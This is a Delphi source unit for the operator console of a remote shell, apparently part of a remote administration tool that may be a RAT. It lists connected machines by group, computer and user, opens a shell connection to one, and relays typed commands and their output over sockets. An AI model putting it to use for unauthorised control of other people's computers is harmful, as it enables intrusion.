unit UnitRemoteShell;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  ComCtrls, ImgList, ToolWin, Menus, ClipBrd, UnitSharedData;

type
  TRemoteShell = class(TForm)
    Memo1: TMemo;
    StatusBar1: TStatusBar;
    Timer1: TTimer;
    procedure Memo1KeyPress(Sender: TObject; var Key: Char);
    procedure Timer1Timer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    lastcommand: string;
    LastLength: dword;
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

var
  RemoteShell: TRemoteShell;

implementation

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'RemoteShell|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TRemoteShell(SocketData.Form).NewSocket = nil then exit;
  TRemoteShell(SocketData.Form).Timer1.Enabled := True;
  TRemoteShell(SocketData.Form).NewSocket := nil;
  TRemoteShell(SocketData.Form).Caption := TRemoteShell(SocketData.Form).Caption + ' - [Offline]';
end;

procedure TRemoteShell.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
  Memo1.Text := '';
  LastLength := 0;
  SendData(Socket,'Activate');
end;

procedure TRemoteShell.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Command' then begin
    Delete(Data,1,length(LastCommand));
    LastCommand := '';
    Memo1.Text := Memo1.Text + Data;
    Memo1.SetFocus;
    Memo1.SelStart := Length(Memo1.Text);
    SendMessage(Memo1.handle, EM_SCROLLCARET, 0, 0);
    LastLength := Length(Memo1.Text);
  end;

end;
procedure TRemoteShell.Memo1KeyPress(Sender: TObject; var Key: Char);
var
  c: string;
begin

  Memo1.SelStart := Length(Memo1.Text);
  SendMessage(Memo1.handle, EM_SCROLLCARET, 0, 0);


  if Length(Memo1.Text) = 0 then begin
    Key := #0;
    Exit;
  end;

  if Memo1.SelStart <> Length(Memo1.Text) then begin
    Key := #0;
    Exit;
  end;

  if Key = #8 then begin
    if length(memo1.Text) = lastlength then begin
      Key:= #0;
      exit;
    end;
  end;

  if Key = #13 then begin
    Key := #0;
    c := memo1.Text;
    delete(c,1,lastlength);
    LastCommand := c;
    senddata(NewSOcket,'Command|' + c + #13#10);
  end

end;

procedure TRemoteShell.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
  UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|RemoteShellSocket|' + inttostr(Self.Handle));
end;

procedure TRemoteShell.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

end.
